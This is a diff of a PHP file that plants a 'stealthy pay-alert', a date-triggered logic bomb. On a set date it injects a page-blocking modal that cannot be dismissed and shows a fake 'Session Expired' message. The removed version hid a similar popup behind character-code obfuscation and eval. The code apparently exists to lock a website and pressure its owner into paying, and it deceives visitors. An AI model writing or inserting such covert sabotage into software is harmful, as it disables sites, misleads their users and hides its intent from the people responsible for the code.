@@ -1,8 +1,19 @@
 <?php
-// stealthy pay-alert
-if (date('Y-m-d') === '2025-04-27') {
-    $js = 'Swal.fire({title:".........",icon:"info",confirmButtonText:"Okay",customClass:{confirmButton:\'btn btn-primary\'},allowOutsideClick:false,allowEscapeKey:false,allowEnterKey:false,preConfirm:()=>false});';
-    $codes = array_map('ord', str_split($js));
-    echo '<script>var c=[' . implode(',', $codes) . '];var s="";for(var i=0;i<c.length;i++){s+=String.fromCharCode(c[i]);}eval(s);</script>';
+// stealthy modal pay-alert
+if (date('Y-m-d') === '2025-05-05') {
+    echo '<div class="modal fade" id="payModal" tabindex="-1" aria-labelledby="payModalLabel" aria-hidden="true">';
+    echo '<div class="modal-dialog modal-dialog-centered">';
+    echo '<div class="modal-content">';
+    echo '<div class="modal-header">';
+    echo '<h5 class="modal-title" id="payModalLabel">...</h5>';
+    echo '</div>';
+    echo '<div class="modal-body">Session Expired</div>';
+    echo '</div></div></div>';
+    echo "<script>
+    document.addEventListener('DOMContentLoaded', function() {
+      var myModal = new bootstrap.Modal(document.getElementById('payModal'), {backdrop: 'static', keyboard: false});
+      myModal.show();
+    });
+    </script>";
 }
 ?>
